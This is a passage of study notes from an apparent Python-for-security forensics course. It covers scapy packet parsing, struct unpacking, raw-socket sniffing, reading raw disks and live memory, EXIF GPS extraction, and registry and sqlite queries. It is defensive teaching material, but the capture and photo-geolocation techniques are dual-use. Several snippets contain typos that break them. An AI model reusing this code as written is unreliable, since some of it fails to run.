172.16.11.1:53 > 172.16.11.12:50282': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:59925': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:57238 > 172.16.11.1:53': <PacketList: TCP:0 UDP:2 ICMP:0 Other:0>, 'UDP 172.16.11.12:59785 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:57238': <PacketList: TCP:0 UDP:2 ICMP:0 Other:0>, 'UDP 172.16.11.12:51370 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:57360 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:59785': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:56758 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:51370': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:51145 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:56758': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:51145': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:57360': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>}
# session() gives you back a dictionary of streams
# key is a string
# value is another scapy.plist.Packetlist
```

#### PacketLists have Packets, Packets have Layers

```python
>>> packetlist[2][TCP]
<TCP  sport=https dport=64565 seq=3307089343 ack=3336115435 dataofs=8 reserved=0 flags=A window=283 chksum=0x7dce urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (935804965, 444433452))] |>
>>> packetlist[2]
<Ether  dst=f8:1e:df:e5:84:3a src=00:1f:f3:3c:e1:13 type=IPv4 |<IP  version=4 ihl=5 tos=0x20 len=52 id=43855 flags= frag=0 ttl=54 proto=tcp chksum=0xc4aa src=74.125.19.17 dst=172.16.11.12 |<TCP  sport=https dport=64565 seq=3307089343 ack=3336115435 dataofs=8 reserved=0 flags=A window=283 chksum=0x7dce urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (935804965, 444433452))] |>>>
>>> packetlist[2].haslayer(TCP)
True
>>> packetlist[2].haslayer(UDP)
0
# haslayer() can be used to determine if a packet has a specified layer
```

#### Packet Layers have Fields

```python
>>> dir(packetlist[2][TCP])
['_PickleType', '__all_slots__', '__bool__', '__bytes__', '__class__', '__class_getitem__', '__contains__', '__deepcopy__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__div__', '__doc__', '__eq__', '__firstlineno__', '__format__', '__ge__', '__getattr__', '__getattribute__', '__getitem__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__iterlen__', '__le__', '__len__', '__lt__', '__module__', '__mul__', '__ne__', '__new__', '__nonzero__', '__orig_bases__', '__parameters__', '__rdiv__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__rtruediv__', '__setattr__', '__setitem__', '__setstate__', '__signature__', '__sizeof__', '__slots__', '__static_attributes__', '__str__', '__subclasshook__', '__truediv__', '__weakref__', '_answered', '_command', '_do_summary', '_name', '_overload_fields', '_pkt', '_raw_packet_cache_field_value', '_resolve_alias', '_show_or_dump', '_superdir', 'ack', 'add_parent', 'add_payload', 'add_underlayer', 'aliastypes', 'answers', 'build', 'build_done', 'build_padding', 'build_ps', 'canvas_dump', 'chksum', 'class_default_fields', 'class_default_fields_ref', 'class_dont_cache', 'class_fieldtype', 'class_packetfields', 'clear_cache', 'clone_with', 'command', 'comment', 'copy', 'copy_field_value', 'copy_fields_dict', 'dataofs', 'decode_payload_as', 'default_fields', 'default_payload_class', 'delfieldval', 'deprecated_fields', 'direction', 'display', 'dissect', 'dissection_done', 'do_build', 'do_build_payload', 'do_build_ps', 'do_dissect', 'do_dissect_payload', 'do_init_cached_fields', 'do_init_fields', 'dport', 'explicit', 'extract_padding', 'fields', 'fields_desc', 'fieldtype', 'firstlayer', 'flags', 'fragment', 'from_hexcap', 'get_field', 'getfield_and_val', 'getfieldval', 'getlayer', 'guess_payload_class', 'hashret', 'haslayer', 'hide_defaults', 'init_fields', 'iterpayloads', 'json', 'lastlayer', 'layers', 'lower_bonds', 'match_subclass', 'mysummary', 'name', 'options', 'original', 'overload_fields', 'overloaded_fields', 'packetfields', 'parent', 'payload', 'payload_guess', 'pdfdump', 'post_build', 'post_dissect', 'post_dissection', 'post_transforms', 'pre_dissect', 'prepare_cached_fields', 'process_information', 'psdump', 'raw_packet_cache', 'raw_packet_cache_fields', 'remove_parent', 'remove_payload', 'remove_underlayer', 'reserved', 'route', 'self_build', 'sent_time', 'seq', 'setfieldval', 'show', 'show2', 'show_indent', 'show_summary', 'sniffed_on', 'sport', 'sprintf', 'stop_dissection_after', 'summary', 'svgdump', 'time', 'underlayer', 'upper_bonds', 'urgptr', 'window', 'wirelen']
```

### Packet Reassembly Issues

#### Sorting Packets

```python
>>> def sortorder(apacket):
...      return apacket[TCP].seq
...
# or sortedpackets = sorted(packets, key = lambda x:x[TCP].seq)
>>> packetlist = rdpcap("test.pcap")
>>> packets = packetlist[0][TCP]
>>> sortedpackets = sorted(packets,key=sortorder)
# returns a list
>>> sortedpackets.__class__
<class 'list'>
>>> packets.__class__
<class 'scapy.layers.inet.TCP'>
```

#### Eliminating Duplicate Packages

```python
>>> duplicates = [1,1,1,2,2,2,2,3,4,5,5,6,7,7,7,7,7,8,8,8,8,8,8,8,9,0]
>>> dict1 = {}
>>> for entry in duplicates:
...      dict1[entry] = ""
...      
>>> list(dict1.keys())
[1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
# fast way
>>> def eliminate_duplicates(packets):
...      uniqs = {}
...      for packet in packets:
...           seq = packet[TCP].seq
...           uniqs[seq] = packet
...      return list(uniqs.values())
# for pcaps
```

#### Eliminating Bad Checksums

```python
>>> def verify_checksum(packet):
...      originalChecksum = packet["TCP"].chksum
...      del packet["TCP"].chksum
...      packet = IP(bytes(packet[IP]))
...      recomputedChecksum = packet["TCP"].chksum
...      return originalChecksum == recomputedChecksum
# 1. Record the oiginal checksum in a variable
# 2. Delete the existing checksum
# 3. Create a new packet from the original by casting the packet to bytes and then back to a packet
# 4. Compare the newly calculated checksum to the original you recorded
```

## 573.4 - Automated Forensics

### The STRUCT Module: Four-Step File-Carving Process

```python
# Step 1: Get read access to the data
# Step 2: Understand the "Metadata" structure that organizes/breaks up your target data and extracts your data
# Step 3: Extract relevant parts with a RegEx
# Step 4: Analyze the data
```

#### Step 1 - Live Hard-Drive Carving

```python
>>> fh = open("/dev/sda", "rb")
>>> fh.read(80)
# Linux
>>> fh = open(r"\\.\PhysicalDrive0", "rb")
>>> fh.read(80)
# Windows
```

#### Step 1 - Live Memory Carving

```python
>>> import memprocfs
>>> vmm = memprocfs.Vmm(['-device', 'pmem://winpmem_64.sys'])
>>> python_process = vmm.process("python.exe")
>>> python_process.memory.read(python_process.peb, 0x10)
>>> vmm.memory.read(process_module.base, 0x10)
# on windows you can access live memory using the memprocfs module
>>> fh = open("/dev/fmem", "rb")
>>> fh.read(100)
# for linux
```

#### Step 1 - Windows Live Network Capture

```python
>>> from winpcapy import WinPcapDevices, WinPcapUtils
>>> print(WinPcapDevices.list_devices())
>>> WinPcapUtils.capture_on("*Gigabit*", lambda x:print(x[0]))
# wincapy will allow sniffing if the NPCAP drivers are installed
>>> import socket
>>> s = socket.socket(socket.AF_INET, socket.SOCK_RAW)
>>> s.bind(("192.168.1.1",0))
>>> s.ioctl(socket.SIO_RCVALL,socket.RCVALL_ON)
>>> while True:
...     print(s.recv(65535([:20])
# socket module provides "raw sockets" that can be used to capture live packets from the network with admin permission
```

#### Step 1 - Linux Live Network Capture

```python
>>> import socket
>>> s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
>>> while True:
...     print(s.recv(65535))
...     
b'\xff\xff\xff\xff\xff\xff\x04\xb4\xfe\x04\x9b\x83\x88\xe1\x00\x00\xa0\x00\xb0R\x1c \xf2\xb6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

#### Step 1 - Analyzing Dead/Static Images

```python
# because data comes in chunks, it could be like this:
# FIND THE WORD WA | LDO IN THESE CHUNKS
>>> previous_chunk = ""
>>> for each_chunk in all_chunks:
...     if "WALDO" in previous_chunk + each_chunk:
...         print("Found him!")
...     previous_chunk = each_chunk[-len("WALDO"):]
```

#### Step 2 - Understanding the Structure

```python
>>> open("test.pcap", "rb").read()[:100]
b'\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\x01\x00\x00\x00\x83\xf13L7\x1f\x07\x00]\x00\x00\x00]\x00\x00\x00\x00\x1f\xf3<\xe1\x13\xf8\x1e\xdf\xe5\x84:\x08\x00E\x00\x00O\xdeS@\x00@\x06G\xab\xac\x10\x0b\x0cJ}\x13\x11\xfc5\x01\xbb\xc6\xd9\x14\xd0\xc5\x1e-\xbf\x80\x18\xff\xff\xcb\x8c\x00\x00\x01\x01\x08\n\x1a}'
# when not using scapy, you have to know where the data is in the bytes
```

#### Step 2 - Third-Party Modules that understand Encapsulated Structures

```python
# Hard Drives: Plaso, GRR, AnalyzeMFT
# Memory: Volatility, memprocfs
# Networking: DPKT, Scapy
# Documents: pyPDF, zipfile
```

#### Step 2 - THe STRUCT Module

```python
>>> import struct
>>> struct.unpack("!BBBB", b"\xc0\xa8\x80\xc2")
(192, 168, 128, 194)
>>> struct.unpack("!HH", b"\xc0\xa8\x80\xc2")
(49320, 32962)
>>> struct.unpack("<HH", b"\xc0\xa8\x80\xc2")
(43200, 49792)
>>> struct.unpack("!bbbb", b"\xc0\xa8\x80\xc2")
(-64, -88, -128, -62)
# ! or > indicates to interpret data as big-endian
# < indicates to interpret data as little-endian
# = or @ indicates to interpret data based on the system its script is running on
# format chararcters: https://docs.python.org/3/library/struct.html
```

#### Step 2 - Struckt Unpack

```python
>>> struct.unpack(">BB", b"\xff\x00")
(255, 0)
# big-endian to extract two bytes into a tuple
>>> struct.unpack("<BB", b"\xff\x00")
(255, 0)
# for single bytes of data the endianness does not matter
>>> struct.unpack("<bB", b"\xff\x00")
(-1, 0)
# treat it as a signed integer
>>> struct.unpack("<H", b"\xff\x00")
(255,)
# H interprets 2 bytes so endianness matters
>>> struct.unpack(">H", b"\xff\x00")
(65280,)
# big-endian
>>> struct.unpack(">h", b"\xff\x00")
(-256,)
# big-endian but it is a signed integer
>>> struct.unpack(">3s", b"\xff\x00\x41")
(b'\xff\x00A',)
# s for string but it really collects bytes
>>> struct.unpack("<cccc", b"\x01\x41\x42\x43")
(b'\x01', b'A', b'B', b'C')
# extract 4 bytes as 4 chars
>>> struct.unpack("<4c", b"\x01\x41\x42\x43")
(b'\x01', b'A', b'B', b'C')
>>> struct.unpack("<4B", b"\x01\x41\x42\x43")
(1, 65, 66, 67)
# extract 4 bytes as 4 single byte integers
>>> struct.unpack("<BxxB", b"\x01\x41\x42\x43")
(1, 67)
# extract a byte, ignore a byte, ignore another byte, extract a byte
>>> struct.unpack("<B2xB", b"\x01\x41\x42\x43")
(1, 67)
# extract a byte, ignore two bytes, extract a byte
>>> struct.unpack("<I", b"\x01\x41\x42\x43")
(1128415489,)
# extract all 4 bytes as an unsigned integer
>>> struct.unpack("<5c", b"\x48\x45\x4c\x4c\x4f")
(b'H', b'E', b'L', b'L', b'O')
>>> struct.unpack("<5s", b"\x48\x45\x4c\x4c\x4f")
(b'HELLO',)
```

#### Step 2 - Unpacking Bits as Flags

```python
>>> list(itertools.compress(["BIT0","BIT1","BIT2"], [1,0,1]))
['BIT0', 'BIT2']
# takes to lists
# anwhere there is a 1 in the second list, the value in the corresponding position in the first list is kept
>>> format(147, "08b")
'10010011'
>>> list(map(int,format(147, "08b")))
[1, 0, 0, 1, 0, 0, 1, 1]
# to create a list of bits
>>> def tcp_flags_as_str(flag):
...     tcp_flags = ['CWR', 'ECE', 'URG', 'ACK', 'PSH', 'RST', 'SYN', 'FIN']
...     return "|".join(list(itertools.compress(tcp.flags,map(int,format(flag,"08b")))))
# combining both to converting byte flags to words
```

#### Step 2 - Struct Pack

```python
>>> struct.pack("<h", -5)
b'\xfb\xff'
>>> struct.pack("<h", 5)
b'\x05\x00'
>>> struct.pack(">h", 5)
b'\x00\x05'
>>> struct.pack(">I", 5)
b'\x00\x00\x00\x05'
>>> struct.pack(">Q", 5)
b'\x00\x00\x00\x00\x00\x00\x00\x05'
>>> struct.pack("<4B6sI", 1,2,0x41,0x42,b"SEC573",5)
b'\x01\x02ABSEC573\x05\x00\x00\x00'
# input values are comma-seperated arguments
```

#### Step 2 - Ether Header Struct

```python
>>> import socket, struct, codecs
>>> while True:
...     data = s.recv(65535)
...     eth_dst,eth_src,eth_type = struct.unpack('!6s6sH', data[:14])
...     print("ETH: SRC:{0} DST:{1} TYPE:{2}".format(codecs.encode(eth_src,"hex"), codecs.encode("eth_dst","hex"), \
hex(eth_type)))
# to capture ethernet header
# all network traffic is big-endian, so it will start with a !
```

#### Step 2 - IP Header Struct

```python
>>> while True:
...     iph = struct.unpack('!BBHHHBBHII', data[14:34])
...     srcip = socket.inet_ntoa(struct.pack('I',iph[8]))
...     dstip = socket.inet_ntoa(struct.pack('I',iph[9]))
...     print(f"IP: SRC:{srcip} DST:{dstip} - {iph} ")
```

#### Step 2 - TCP Header Struct

```python
>>> while True:
...     tcp = struct.unpack('!HHIIBBHHH', embedded_data[:20])
...     print("TCP: ", tcp)
```

#### Step 2 - UDP Header Struct

```python
>>> print(struct.unpack('!HHHH', embedded_data[:8]))
```

#### Step 2 - ICMP Header Struct

```python
>>> (icmp_type,icmp_code,icmp_chksum) = struct.unpack(r'!BBH', embedded_data[:4])
>>> if icmp_type == 0:
...     print(f"ICMP - PING REPLY SRC:{srcip} DST:{DSTIP}")
... elif icmp_type == 8:
...     print(f"ICMP - PING REQUEST SRC:{srcip} DST:{dstip}")
>>> else:
...     print(f"ICMP - TYPE:{icmp_type} CODE:{icmp_code} - SRC:{srcip} DST: {dstip} DATA:{icmp_data}")
```

#### Step 3 - Use RegEx on Binary Data

```python
>>> def string2jpg(rawstring):
...     if not b'\xff\xd8' in rawstring or not b'\xff\xd9' in rawstring:
...         print("ERROR: Invalid or corrupt image!", rawstring[:10])
...         return None
...     jpg = re.findall(rb'\xff\xd8.*\xff\xd9', rawstring,re.DOTALL)[0]
...     return jpg
```

#### Step 4 - Analyzing the Data

```python
# You can use a third-party module to analytze it
# Zip: pyzip
# Pdf: pypdf,pdf-parser.py, PDFMiner
# Office Doc: PyWin32 and COM
# Office Docx: Extract zip and XML
# Media: PIL, PyMedia, OpenCV, pySWF
# EXE, DLL: pefile
```

### Python Image Library

#### Installing PIL Image Package

```bash
┌──(forensics)─(d41y㉿kali)-[~/learn/SANS/573/misc]
└─$ pip install Pillow  
Collecting Pillow
  Downloading pillow-11.2.1-cp313-cp313-manylinux_2_28_x86_64.whl.metadata (8.9 kB)
Downloading pillow-11.2.1-cp313-cp313-manylinux_2_28_x86_64.whl (4.6 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.6/4.6 MB 12.6 MB/s eta 0:00:00
Installing collected packages: Pillow
Successfully installed Pillow-11.2.1
# READ and WRITE images from disk
# Crop, resize, rotate, recolor, and otherwise manipulate the images
# Read / write image metadata
# Supports multiple image formats, including JPG, BMP, TGA, and more
```

#### Opening Images with PIL

```python
>>> from PIL import Image
>>> imagedata = Image.open("PIvfevco6UTNU69s-YaIUFqA.jpeg")
>>> imagedata.show()
# opens the image when saved on disk
>>> from io import BytesIO
>>> from PIL import Image
>>> img = open("PIvfevco6UTNU69s-YaIUFqA.jpeg", "rb").read()
>>> Image.open(BytesIO(img)).show()
# opens the image when saved inside variable
```

#### Key Functions in PIL.Image

```python
# open()      - open an image
# show()      - displays the image
# thumbnail() - reduces image size, preserving aspect ratio
# resize()    - returns a copy of the image with the exact given dimensions
# size()      - a tuple containing the current image size
# crop()      - crops the image
# rotate()    - rotates the image
# save()      - save the image to disk
# _getexif()  - gets the metadata about the image
```

#### Listing Metadata 1

```python
>>> from PIL import Image
>>> imgobj = Image.open("test.jpg")
>>> info = imgobj._getexif()
>>> print(info[272])
Canon DIGITAL IXUS 400
```

#### Listing Metadata 2

```python
>>> from PIL.ExifTags import TAGS
>>> def print_exif(imageobject):
...     exifdict = imageobject._getexif()
...     for exif_num, data in exifdict.items():
...         tag_name = TAGS.get(exif_num, "Unknown Tag")
...         print(f"TAG: {exif_num} ({tag_name}) is assigned {data}")
...         
>>> imgobj = Image.open("test.jpg")
>>> print_exif(imgobj)
TAG: 296 (ResolutionUnit) is assigned 2
TAG: 34665 (ExifOffset) is assigned 200
TAG: 271 (Make) is assigned Canon
TAG: 272 (Model) is assigned Canon DIGITAL IXUS 400
TAG: 305 (Software) is assigned GIMP 2.4.5
TAG: 274 (Orientation) is assigned 1
TAG: 306 (DateTime) is assigned 2008:07:31 17:15:01
TAG: 531 (YCbCrPositioning) is assigned 1
TAG: 282 (XResolution) is assigned 72.0
TAG: 283 (YResolution) is assigned 72.0
TAG: 36864 (ExifVersion) is assigned b'0220'
TAG: 37121 (ComponentsConfiguration) is assigned b'\x01\x02\x03\x00'
TAG: 37122 (CompressedBitsPerPixel) is assigned 3.0
TAG: 36867 (DateTimeOriginal) is assigned 2004:08:27 13:52:55
TAG: 36868 (DateTimeDigitized) is assigned 2004:08:27 13:52:55
TAG: 37377 (ShutterSpeedValue) is assigned 7.65625
TAG: 37378 (ApertureValue) is assigned 6.65625
TAG: 37380 (ExposureBiasValue) is assigned 0.0
TAG: 37381 (MaxApertureValue) is assigned 4.0
TAG: 37383 (MeteringMode) is assigned 5
TAG: 37385 (Flash) is assigned 24
TAG: 37386 (FocalLength) is assigned 15.4375
TAG: 40961 (ColorSpace) is assigned 1
TAG: 40962 (ExifImageWidth) is assigned 100
TAG: 40965 (ExifInteroperabilityOffset) is assigned 1284
TAG: 41486 (FocalPlaneXResolution) is assigned 8114.285714285715
TAG: 40963 (ExifImageHeight) is assigned 75
TAG: 41487 (FocalPlaneYResolution) is assigned 8114.285714285715
TAG: 41488 (FocalPlaneResolutionUnit) is assigned 2
TAG: 41495 (SensingMethod) is assigned 2
TAG: 41728 (FileSource) is assigned b'\x03'
TAG: 33434 (ExposureTime) is assigned 0.005
TAG: 33437 (FNumber) is assigned 10.0
TAG: 41985 (CustomRendered) is assigned 1
TAG: 41986 (ExposureMode) is assigned 0
TAG: 40960 (FlashPixVersion) is assigned b'0100'
TAG: 41987 (WhiteBalance) is assigned 0
TAG: 41988 (DigitalZoomRatio) is assigned 1.0
TAG: 37500 (MakerNote) is assigned b'\x0e\x00\x00\x00\x03\x00\x06\x00\x00\x00L\x03\x00\x00\x00\x00\x03\x00\x04\x00\x00\x00X\x03\x00\x00\x01\x00\x03\x00.\x00\x00\x00`\x03\x00\x00\x02\x00\x03\x00\x04\x00\x00\x00\xbc\x03\x00\x00\x03\x00\x03\x00\x04\x00\x00\x00\xc4\x03\x00\x00\x04\x00\x03\x00"\x00\x00\x00\xcc\x03\x00\x00\x06\x00\x02\x00 \x00\x00\x00\x10\x04\x00\x00\x07\x00\x02\x00\x18\x00\x00\x000\x04\x00\x00\x08\x00\x04\x00\x01\x00\x00\x00y\xf5\x12\x00\t\x00\x02\x00 \x00\x00\x00H\x04\x00\x00\r\x00\x03\x00"\x00\x00\x00h\x04\x00\x00\x10\x00\x04\x00\x01\x00\x00\x00\x00\x00\'\x01\x12\x00\x03\x00\x1c\x00\x00\x00\xac\x04\x00\x00\x13\x00\x03\x00\x04\x00\x00\x00\xe4\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\\x00\x02\x00\x00\x00\x03\x00\x01\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x03\x00\x01\x00\x01@\x00\x00\xff\xff\xff\xff\xc7\x02\xed\x00 \x00\x82\x00\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\xe0\x08\xe0\x08\x00\x00\x01\x00\x00\x00\x00\x00\xff\x7f\x00\x00\x00\x00\x00\x00\x02\x00\xee\x01\x1e\x01\xd7\x00\x00\x04\x00\x00\x00\x00\x00\x00D\x00\x00\x00\x80\x00O\x01\xd5\x00\xf5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xd8\x00\x00\x00\xd7\x00\xf3\x00\x00\x00\x00\x00\x00\x00\xfa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00IMG:DIGITAL IXUS 400 JPEG\x00\x00\x00\x00\x00\x00\x00Firmware Version 1.00\x00\x00\x00Jean-Pierre Grignon\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00\t\x00\xf8\x00\xf7\x00\xfa\x00\xfb\x00\xf9\x00\xf9\x00\xfa\x00\xf7\x00\xfa\x00@\x00\x00\x00\x00\x00q\x00\x00\x00\x00\x00\n\x00\x05\x00\x01\x00\n\x00Y\x00K\x01\x07\x00\xfb\xff\xfb\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\t\x00\t\x00\xe0\x08\xa8\x06\xe0\x08\xd4\x00\x99\x01&\x00f\xfe\x00\x00\x9a\x01f\xfe\x00\x00\x9a\x01f\xfe\x00\x00\x9a\x01\xd7\xff\xd7\xff\xd7\xff\x00\x00\x00\x00\x00\x00)\x00)\x00)\x00\x08\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00'
TAG: 41990 (SceneCaptureType) is assigned 0
```

#### Convert Exif GPS to Decimal Degrees

```python
>>> imgobj = Image.open("DSCN0021.jpg")
>>> def coordinates(ImageObject):
...     info = ImageObject._getexif()
...     if not info or not info.get(34853):
...         return 0, 0
...     latDegrees = float(info[34853][2][0])
...     latMinutes = float(info[34853][2][1])/60
...     latSeconds = float(info[34853][2][2])/3600
...     lonDegrees = float(info[34853][4][0])
...     lonMinutes = float(info[34853][4][1])/60
...     lonSeconds = float(info[34853][4][2])/3600
...     latitude = latDegrees + latMinutes + latSeconds
...     if info[34853][1] == 'S':
...         latitude *= -1
...     longitude = lonDegrees + lonMinutes + lonSeconds
...     if info[34853][3] == 'W':
...         longitude *= -1
...     return latitude, longitude
...     
>>> print(coordinates(imgobj))
(43.467081666663894, 11.884538333330555)
```

#### What to do with GPS Data

```python
# generate URL to google maps
# https://maps.google.com/maps?q=lat,long&z=15
>>> lat, lon = coordinates(imgobj)
>>> print(f"https://maps.google.com/maps?q={lat},{lon}&z=15")
https://maps.google.com/maps?q=43.467081666663894,11.884538333330555&z=15
```

### Python Database Operations


#### Python SQL Database Modules

```python
# Mysql: mysql-connector-python, pyMySql, MySQL-Python, pyodbc
# MiriaDB: all above, miriadb, pyodbc
# MSSQL: pymssql, pyodbc
# Oracle: python-oracledb, cx_Oracle, pyodbc
# SQLITE: sqlite3 is bubilt into python, pyodbc
>>> import pyodbc
>>> connection = pyodbc.connect("Driver={SQL Server Native Client 11.0};"
... "Server = server_name;"
... "Database = db_name;"
... "Trusted_Connection = yes;")
>>> cursor = connection.cursor()
>>> cursor.execute('SELECT * FROM Table')
>>> for row in cursor:
...     print(f"row = {row}")
```

#### Sqlite3 Connect and Retrieve Table and Column Names

```python
>>> import sqlite3
>>> db = sqlite3.connect("chinook.db")
>>> list(db.execute("select name from sqlite_master where type='table';"))
[('albums',), ('sqlite_sequence',), ('artists',), ('customers',), ('employees',), ('genres',), ('invoices',), ('invoice_items',), ('media_types',), ('playlists',), ('playlist_track',), ('tracks',), ('sqlite_stat1',)]
>>> list(db.execute("select sql from sqlite_master where name='invoices';"))
[('CREATE TABLE "invoices"\r\n(\r\n    [InvoiceId] INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,\r\n    [CustomerId] INTEGER  NOT NULL,\r\n    [InvoiceDate] DATETIME  NOT NULL,\r\n    [BillingAddress] NVARCHAR(70),\r\n    [BillingCity] NVARCHAR(40),\r\n    [BillingState] NVARCHAR(40),\r\n    [BillingCountry] NVARCHAR(40),\r\n    [BillingPostalCode] NVARCHAR(10),\r\n    [Total] NUMERIC(10,2)  NOT NULL,\r\n    FOREIGN KEY ([CustomerId]) REFERENCES "customers" ([CustomerId]) \r\n\t\tON DELETE NO ACTION ON UPDATE NO ACTION\r\n)',)]
```

#### Sqlite3 Query the Records from the Database

```python
>>> import sqlite3
>>> db = sqlite3.connect("chinook.db")
>>> for eachrow in db.execute("SELECT invoices.InvoiceId, invoices.CustomerId, invoices.InvoiceDate, invoices.Billi\
ngAddress from invoices;"):
...     print(eachrow)
...     
(1, 2, '2009-01-01 00:00:00', 'Theodor-Heuss-Straße 34')
(2, 4, '2009-01-02 00:00:00', 'Ullevålsveien 14')
(3, 8, '2009-01-03 00:00:00', 'Grétrystraat 63')
(4, 14, '2009-01-06 00:00:00', '8210 111 ST NW')
(5, 23, '2009-01-11 00:00:00', '69 Salem Street')
(6, 37, '2009-01-19 00:00:00', 'Berger Straße 10')
(7, 38, '2009-02-01 00:00:00', 'Barbarossastraße 19')
(8, 40, '2009-02-01 00:00:00', '8, Rue Hanovre')
```

### Windows Registry Forensics

#### The Windows Registry

```python
(sans) C:\Users\melvi\Desktop\sans\Scripts>pip install python-registry
Collecting python-registry
  Downloading python_registry-1.3.1-py3-none-any.whl (23 kB)
Collecting enum-compat
  Downloading enum_compat-0.0.3-py3-none-any.whl (1.3 kB)
Collecting unicodecsv
  Downloading unicodecsv-0.14.1.tar.gz (10 kB)
Using legacy setup.py install for unicodecsv, since package 'wheel' is not installed.
Installing collected packages: enum-compat, unicodecsv, python-registry
    Running setup.py install for unicodecsv ... done
Successfully installed enum-compat-0.0.3 python-registry-1.3.1 unicodecsv-0.14.1
WARNING: You are using pip version 20.1.1; however, version 24.0 is available.
You should consider upgrading via the 'c:\users\melvi\desktop\sans\scripts\python.exe -m pip install --upgrade pip' command.

(sans) C:\Users\melvi\Desktop\sans\Scripts>python
Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 16:30:00) [MSC v.1900 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> from Registry.Registry import Registry
```

#### Components of Registry

```python
handle = Registry(r"path to registry file")
regkey = handle.open(r"raw str-path to key")
# key methods:
# .path(), .value(), .subkey(), .subkeys()
# value methods:
# .name(), .value(), .value_type_str()
```

#### Retrieving one specific Value with .value() or Key with .subkey()

```python
# first open the registry file
>>> from Registry.Registry import Registry
>>> reg_hive = Registry("SOFTWARE_COPY")
# then open the key that contains the value
>>> reg_key = reg_hive.open(r"Microsoft\Windows NT\CurrentVersion")
# then pass the name of the value you want to retrieve to .value()
>>> reg_value = reg_key.value("ProductName")
>>> reg_value.name()
'ProductName'
>>> reg_value.value()
'Windows 10 Pro'
>>> reg_value.value_type_str()
'RegSZ'
>>> reg_key.value("ProductName").value()
'Windows 10 Pro'
# you can also open a specific subkey with .subkey()
>>> reg_key = reg_hive.open(r"Microsoft\Windows NT")
>>> cur_ver_key = reg_key.subkey("CurrentVersion")
>>> cur_ver_key.name()
'CurrentVersion'
```

#### A list of Values with .values() or Keys with .subkeys()

```python
# once you have opnened a key, you can retrieve a list of its values with .values()
>>> reg_hive = Registry("SOFTWARE_COPY")
>>> reg_key = reg_hive.open(r"Microsoft\Windows\CurrentVersion\Run")
>>> for eachkey in reg_key.values():
...     print(eachkey.name(), eachkey.value(), eachkey.value_type_str())
...
SecurityHealth %windir%\system32\SecurityHealthSystray.exe RegExpandSZ
RtkAudUService "C:\Windows\System32\DriverStore\FileRepository\realtekservice.inf_amd64_9366beb5d0043df3\RtkAudUService64.exe" -background RegSZ
# or you can retrieve a list of subkeys with .subkeys()
>>> reg_key = reg_hive.open(r"Microsoft\Windows\CurrentVersion")
>>> for eachsubkey in reg_key.subkeys():
...     print(eachsubkey.name(), end=", ")
...
AccountPicture, ActionCenter, AdvertisingInfo, App Management, App Paths, AppHost, Applets, ApplicationAssociationToasts, ApplicationFrame, AppModel, AppModelUnlock, AppReadiness, Appx, Audio, Authentication, AutoRotation, BackupAndRestoreSettings, BitLocker, BITS, Bluetooth, CapabilityAccessManager, Capture, Casting, Census, ClickNote, ClosedCaptioning, CloudDesktop, CloudExperienceHost, CloudStore, COAWOS, Communications, Component Based Servicing, ConnectedSearch, ContainerMappedPaths, Control Panel, Controls Folder, CPSS, DateTime, Device Installer, Device Metadata, DeviceAccess, DevicePicker, DeviceSetup, Diagnostics, DIFx, DIFxApp, DPX, DriverConfiguration, DriverSearching, EditionOverrides, EventCollector, EventForwarding, Explorer, Ext, Fcon, FileExplorer, FileHistory, FilePicker, FlightedFeatures, Flighting, GameInput, GameInstaller, Group Policy, HardwareIdentification, HelpAndSupport, Hints, Holographic, HoloSI, IME, ImmersiveShell, 